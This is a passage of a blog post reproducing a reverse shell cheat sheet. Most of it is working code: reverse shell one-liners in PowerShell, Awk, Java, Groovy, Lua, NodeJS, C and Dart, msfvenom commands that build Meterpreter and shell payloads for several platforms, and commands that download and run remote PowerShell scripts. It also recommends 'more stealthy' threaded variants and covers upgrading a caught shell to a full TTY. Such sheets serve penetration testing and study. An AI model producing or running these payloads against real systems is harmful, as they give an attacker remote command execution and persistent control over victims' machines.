<h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-NoP</span> <span class="literal">-NonI</span> <span class="literal">-W</span> <span class="keyword">Hidden</span> <span class="literal">-Exec</span> Bypass <span class="literal">-Command</span> <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.0.0.1&quot;</span>,<span class="number">4242</span>);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );<span class="variable">$sendback2</span>  = <span class="variable">$sendback</span> + <span class="string">&quot;PS &quot;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&quot;&gt; &quot;</span>;<span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-c</span> <span class="string">&quot;<span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient(&#x27;10.0.0.1&#x27;,4242);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Awk"><a href="#Awk" class="headerlink" title="Awk"></a>Awk</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123;s = &quot;/inet/tcp/0/10.0.0.1/4242&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != &quot;exit&quot;) close(s); &#125;&#125;&#x27;</span> /dev/null</span><br></pre></td></tr></table></figure>

<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="string">&quot;/bin/bash -c &#x27;exec 5&lt;&gt;/dev/tcp/10.0.0.1/4242;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#x27;&quot;</span>);</span><br><span class="line">p.waitFor();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Java-Alternative-1"><a href="#Java-Alternative-1" class="headerlink" title="Java Alternative 1"></a>Java Alternative 1</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String host=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> port=<span class="number">4444</span>;</span><br><span class="line">String cmd=<span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">Process p=<span class="keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="keyword">true</span>).start();Socket s=<span class="keyword">new</span> Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="keyword">while</span>(!s.isClosed())&#123;<span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)so.write(pi.read());<span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)so.write(pe.read());<span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span class="number">50</span>);<span class="keyword">try</span> &#123;p.exitValue();<span class="keyword">break</span>;&#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Java-Alternative-2"><a href="#Java-Alternative-2" class="headerlink" title="Java Alternative 2"></a>Java Alternative 2</h4><p><strong>NOTE</strong>: This is more stealthy</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread thread = <span class="keyword">new</span> Thread()&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// Reverse shell here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">thread.start();</span><br></pre></td></tr></table></figure>

<h3 id="War"><a href="#War" class="headerlink" title="War"></a>War</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="number">10.0</span>.<span class="number">0.1</span> LPORT=<span class="number">4242</span> -f war &gt; reverse.war</span><br><span class="line">strings reverse.war | grep jsp # in order to get the name of the file</span><br></pre></td></tr></table></figure>


<h3 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h3><p>Linux only</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">lua <span class="literal">-e</span> <span class="string">&quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;10.0.0.1&#x27;,&#x27;4242&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>

<p>Windows and Linux</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">lua5.<span class="number">1</span> <span class="literal">-e</span> <span class="string">&#x27;local host, port = &quot;10.0.0.1&quot;, 4242 local socket = require(&quot;socket&quot;) local tcp = socket.tcp() local io = require(&quot;io&quot;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &quot;r&quot;) local s = f:read(&quot;*a&quot;) f:close() tcp:send(s) if status == &quot;closed&quot; then break end end tcp:close()&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>),</span><br><span class="line">        cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>),</span><br><span class="line">        sh = cp.spawn(<span class="string">&quot;/bin/sh&quot;</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">    client.connect(<span class="number">4242</span>, <span class="string">&quot;10.0.0.1&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>; <span class="comment">// Prevents the Node.js application form crashing</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;nc -e /bin/sh 10.0.0.1 4242&#x27;</span>)</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">-<span class="keyword">var</span> x = <span class="built_in">global</span>.process.mainModule.require</span><br><span class="line">-x(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;nc 10.0.0.1 4242 -e /bin/bash&#x27;</span>)</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</span></span><br></pre></td></tr></table></figure>

<h3 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h3><p>by <a target="_blank" rel="noopener" href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">frohoff</a><br>NOTE: Java reverse shell also work for Groovy</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String host=<span class="string">&quot;10.0.0.1&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> port=<span class="number">4242</span>;</span><br><span class="line">String cmd=<span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">Process p=<span class="keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="keyword">true</span>).start();Socket s=<span class="keyword">new</span> Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="keyword">while</span>(!s.isClosed())&#123;<span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)so.write(pi.read());<span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)so.write(pe.read());<span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span class="number">50</span>);<span class="keyword">try</span> &#123;p.exitValue();<span class="keyword">break</span>;&#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure>

<h4 id="Groovy-Alternative-1"><a href="#Groovy-Alternative-1" class="headerlink" title="Groovy Alternative 1"></a>Groovy Alternative 1</h4><p><strong>NOTE</strong>: This is more stealthy</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread.start &#123;</span><br><span class="line">    <span class="comment">// Reverse shell here</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><p>Compile with <code>gcc /tmp/shell.c --output csh &amp;&amp; csh</code></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;sys/socket.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;netinet/in.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;arpa/inet.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">int</span> port = <span class="number">4242</span>;</span><br><span class="line">    <span class="keyword">struct</span> sockaddr_in revsockaddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> sockt = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    revsockaddr.sin_family = AF_INET;       </span><br><span class="line">    revsockaddr.sin_port = htons(port);</span><br><span class="line">    revsockaddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;10.0.0.1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    connect(sockt, (<span class="keyword">struct</span> sockaddr *) &amp;revsockaddr, </span><br><span class="line">    <span class="keyword">sizeof</span>(revsockaddr));</span><br><span class="line">    dup2(sockt, <span class="number">0</span>);</span><br><span class="line">    dup2(sockt, <span class="number">1</span>);</span><br><span class="line">    dup2(sockt, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> * <span class="keyword">const</span> argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, NULL&#125;;</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, NULL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Dart"><a href="#Dart" class="headerlink" title="Dart"></a>Dart</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;dart:io&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;dart:convert&#x27;</span>;</span><br><span class="line"></span><br><span class="line">main() &#123;</span><br><span class="line">  Socket.connect(<span class="string">&quot;10.0.0.1&quot;</span>, <span class="number">4242</span>).then((socket) &#123;</span><br><span class="line">    socket.listen((data) &#123;</span><br><span class="line">      Process.start(<span class="string">&#x27;powershell.exe&#x27;</span>, []).then((Process process) &#123;</span><br><span class="line">        process.stdin.writeln(<span class="keyword">new</span> String.fromCharCodes(data).trim());</span><br><span class="line">        process.stdout</span><br><span class="line">          .transform(utf8.decoder)</span><br><span class="line">          .listen((output) &#123; socket.write(output); &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">    onDone: () &#123;</span><br><span class="line">      socket.destroy();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="RevShells"><a href="#RevShells" class="headerlink" title="RevShells"></a>RevShells</h2><p><a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a><br><img src= "/img/loading.gif" data-lazy-src="https://user-images.githubusercontent.com/44453666/115149832-d6a75980-a033-11eb-9c50-56d4ea8ca57c.png" alt="image"></p>
<h2 id="Meterpreter-Shell"><a href="#Meterpreter-Shell" class="headerlink" title="Meterpreter Shell"></a>Meterpreter Shell</h2><h3 id="Windows-Staged-reverse-TCP"><a href="#Windows-Staged-reverse-TCP" class="headerlink" title="Windows Staged reverse TCP"></a>Windows Staged reverse TCP</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=<span class="number">10.0</span>.<span class="number">0.1</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> exe &gt; reverse.exe</span><br></pre></td></tr></table></figure>

<h3 id="Windows-Stageless-reverse-TCP"><a href="#Windows-Stageless-reverse-TCP" class="headerlink" title="Windows Stageless reverse TCP"></a>Windows Stageless reverse TCP</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/shell_reverse_tcp LHOST=<span class="number">10.0</span>.<span class="number">0.1</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> exe &gt; reverse.exe</span><br></pre></td></tr></table></figure>

<h3 id="Linux-Staged-reverse-TCP"><a href="#Linux-Staged-reverse-TCP" class="headerlink" title="Linux Staged reverse TCP"></a>Linux Staged reverse TCP</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> linux/x86/meterpreter/reverse_tcp LHOST=<span class="number">10.0</span>.<span class="number">0.1</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> elf &gt;reverse.elf</span><br></pre></td></tr></table></figure>

<h3 id="Linux-Stageless-reverse-TCP"><a href="#Linux-Stageless-reverse-TCP" class="headerlink" title="Linux Stageless reverse TCP"></a>Linux Stageless reverse TCP</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> linux/x86/shell_reverse_tcp LHOST=<span class="number">10.0</span>.<span class="number">0.1</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> elf &gt;reverse.elf</span><br></pre></td></tr></table></figure>

<h3 id="Other-platforms"><a href="#Other-platforms" class="headerlink" title="Other platforms"></a>Other platforms</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> linux/x86/meterpreter/reverse_tcp LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> elf &gt; shell.elf</span><br><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> exe &gt; shell.exe</span><br><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> osx/x86/shell_reverse_tcp LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> macho &gt; shell.macho</span><br><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> asp &gt; shell.asp</span><br><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> java/jsp_shell_reverse_tcp LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> raw &gt; shell.jsp</span><br><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> java/jsp_shell_reverse_tcp LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> war &gt; shell.war</span><br><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> cmd/unix/reverse_python LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> raw &gt; shell.py</span><br><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> cmd/unix/reverse_bash LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> raw &gt; shell.sh</span><br><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> cmd/unix/reverse_perl LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> raw &gt; shell.pl</span><br><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> php/meterpreter_reverse_tcp LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> raw &gt; shell.php; <span class="built_in">cat</span> shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php &#x27;</span> | tr <span class="literal">-d</span> <span class="string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

<h2 id="Spawn-TTY-Shell"><a href="#Spawn-TTY-Shell" class="headerlink" title="Spawn TTY Shell"></a>Spawn TTY Shell</h2><p>In order to catch a shell, you need to listen on the desired port. <code>rlwrap</code> will enhance the shell, allowing you to clear the screen with <code>[CTRL] + [L]</code>.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">rlwrap nc <span class="number">10.0</span>.<span class="number">0.1</span> <span class="number">4242</span></span><br><span class="line"></span><br><span class="line">rlwrap <span class="literal">-r</span> <span class="operator">-f</span> . nc <span class="number">10.0</span>.<span class="number">0.1</span> <span class="number">4242</span></span><br><span class="line"><span class="operator">-f</span> . will make rlwrap use the current <span class="built_in">history</span> file as a completion word list.</span><br><span class="line"><span class="literal">-r</span> Put all words seen on <span class="keyword">in</span>- and output on the completion list.</span><br></pre></td></tr></table></figure>

<p>Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell.</p>
<p>:warning: OhMyZSH might break this trick, a simple <code>sh</code> is recommended</p>
<blockquote>
<p>The main problem here is that zsh doesn’t handle the stty command the same way bash or sh does. […] stty raw -echo; fg[…] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ctrl+z</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$TERM</span> &amp;&amp; tput lines &amp;&amp; tput cols</span><br><span class="line"></span><br><span class="line"><span class="comment"># for bash</span></span><br><span class="line">stty raw <span class="literal">-echo</span></span><br><span class="line">fg</span><br><span class="line"></span><br><span class="line"><span class="comment"># for zsh</span></span><br><span class="line">stty raw <span class="literal">-echo</span>; fg</span><br><span class="line"></span><br><span class="line">reset</span><br><span class="line">export SHELL=bash</span><br><span class="line">export TERM=xterm<span class="literal">-256color</span></span><br><span class="line">stty rows &lt;num&gt; columns &lt;cols&gt;</span><br></pre></td></tr></table></figure>

<p>or use <code>socat</code> binary to get a fully tty reverse shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat file:`tty`,raw,<span class="built_in">echo</span>=0 tcp-listen:12345</span><br></pre></td></tr></table></figure>

<p>Spawn a TTY shell from an interpreter</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/bin/sh <span class="literal">-i</span></span><br><span class="line">python3 <span class="literal">-c</span> <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">python3 <span class="literal">-c</span> <span class="string">&quot;__import__(&#x27;pty&#x27;).spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">python3 <span class="literal">-c</span> <span class="string">&quot;__import__(&#x27;subprocess&#x27;).call([&#x27;/bin/bash&#x27;])&quot;</span></span><br><span class="line">perl <span class="literal">-e</span> <span class="string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span></span><br><span class="line">perl: exec <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">perl <span class="literal">-e</span> <span class="string">&#x27;print `/bin/bash`&#x27;</span></span><br><span class="line">ruby: exec <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">lua: os.execute(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>vi: <code>:!bash</code></li>
<li>vi: <code>:set shell=/bin/bash:shell</code></li>
<li>nmap: <code>!sh</code></li>
<li>mysql: <code>! bash</code></li>
</ul>
<p>Alternative TTY method</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@debian:&#x2F;dev&#x2F;shm$ su - user</span><br><span class="line">su: must be run from a terminal</span><br><span class="line"></span><br><span class="line">www-data@debian:&#x2F;dev&#x2F;shm$ &#x2F;usr&#x2F;bin&#x2F;script -qc &#x2F;bin&#x2F;bash &#x2F;dev&#x2F;null</span><br><span class="line">www-data@debian:&#x2F;dev&#x2F;shm$ su - user</span><br><span class="line">Password: P4ssW0rD</span><br><span class="line"></span><br><span class="line">user@debian:~$ </span><br></pre></td></tr></table></figure>

<h2 id="Fully-interactive-reverse-shell-on-Windows"><a href="#Fully-interactive-reverse-shell-on-Windows" class="headerlink" title="Fully interactive reverse shell on Windows"></a>Fully interactive reverse shell on Windows</h2><p>The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.</p>
<p><strong>ConPtyShell uses the function <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/console/createpseudoconsole">CreatePseudoConsole()</a>. This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).</strong></p>
<p>Server Side:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stty raw -echo; (stty size; cat) | nc -lvnp 3001</span><br></pre></td></tr></table></figure>

<p>Client Side:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IEX(IWR https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;antonioCoco&#x2F;ConPtyShell&#x2F;master&#x2F;Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001</span><br></pre></td></tr></table></figure>

<p>Offline version of the ps1 available at –&gt; <a target="_blank" rel="noopener" href="https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1">https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1</a></p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
<li><a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner">Reverse Bash Shell One Liner</a></li>
<li><a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey - Cheat Sheet Reverse shell</a></li>
<li><a target="_blank" rel="noopener" href="http://netsec.ws/?p=337">Spawning a TTY Shell</a></li>
<li><a target="_blank" rel="noopener" href="https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell">Obtaining a fully interactive shell</a></li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">upload</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://upload.love/2021/07/17/%E5%90%84%E7%A7%8D%E5%8F%8D%E5%BC%B9shell/">http://upload.love/2021/07/17/%E5%90%84%E7%A7%8D%E5%8F%8D%E5%BC%B9shell/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://upload.love" target="_blank">upload</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/image/35a85edf8db1cb133ee5e2433012064893584b9b.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/07/17/%E6%B8%97%E9%80%8F%E5%B0%8F%E7%BB%93/"><img class="prev-cover" data-lazy-src="/image/11111111.jfif" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">渗透小结</div></div></a></div><div class="next-post pull-right"><a href="/2021/07/17/%E6%9A%91%E5%81%87-3/"><img class="next-cover" data-lazy-src="/image/6333.jfif" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">暑假</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">upload</div><div class="author-info__description">每天都要开心</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">141</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">132</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://tcyba.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tcyba" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2384372932@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">我希望我以后每天都能开开心心！</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse-Shell-Cheat-Sheet"><span 